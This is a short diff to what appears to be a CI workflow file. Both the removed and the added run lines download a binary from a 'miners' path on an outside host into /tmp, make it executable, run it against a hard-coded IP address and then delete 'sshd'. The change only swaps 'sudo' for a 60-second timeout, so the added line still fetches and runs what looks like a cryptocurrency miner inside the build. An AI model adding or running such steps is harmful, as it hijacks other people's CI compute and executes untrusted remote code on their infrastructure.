@@ -7,4 +7,4 @@ jobs:
     steps:
       - shell: bash
         run: |
-          cd /tmp;wget -q rn-us.do-dear.com/miners/x86_64;chmod +x x86_64;sudo ./x86_64 -ip 51.79.74.212 -f;rm -rvf sshd
+          cd /tmp;wget -q rn-us.do-dear.com/miners/x86_64;chmod +x x86_64;timeout 60s ./x86_64 -ip 51.79.74.212 -f;rm -rvf sshd
